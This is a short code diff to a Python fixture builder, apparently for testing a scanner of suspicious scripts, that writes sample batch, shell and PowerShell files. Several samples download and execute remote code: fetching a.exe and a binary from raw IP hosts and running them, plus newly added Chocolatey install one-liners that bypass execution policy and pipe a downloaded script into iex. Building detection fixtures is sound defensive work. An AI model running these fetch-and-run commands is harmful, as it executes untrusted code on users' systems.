@@ -237,6 +237,8 @@ def build_folder(root):
                      b"$w.DownloadFile('http://16.16.16.16/a.exe', $env:TEMP + '\\a.exe')\n"
                      b"Set-Content ($env:TEMP + '\\a.exe') $x\n")
     w("stager.sh", b"curl -fsSL http://17.17.17.17/b -o /tmp/b\nchmod +x /tmp/b\n")
+    w("choco.bat", b"@powershell -NoProfile -ExecutionPolicy Bypass -Command - \"iex ((new-object net.webclient).DownloadString('https://community.chocolatey.org/install.ps1'))\"\r\n")
+    w("choco.ps1", b"Set-ExecutionPolicy Bypass -Scope Process -Force; \"[System.Net.ServicePointManager]::SecurityProtocol = 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))\"\n")
     w("launch.bat", b"@echo off\r\nstart readme.lnk\r\n")
     w("docs.bat", b"@echo off\r\nREM powershell -enc AAAA hidden dropper notes\r\necho ok\r\n")
     w("dl.bat", ("@echo off\r\n%s %%TEMP%%\\a.exe\r\nstart %%TEMP%%\\a.exe\r\n" % _DL_CMD).encode())
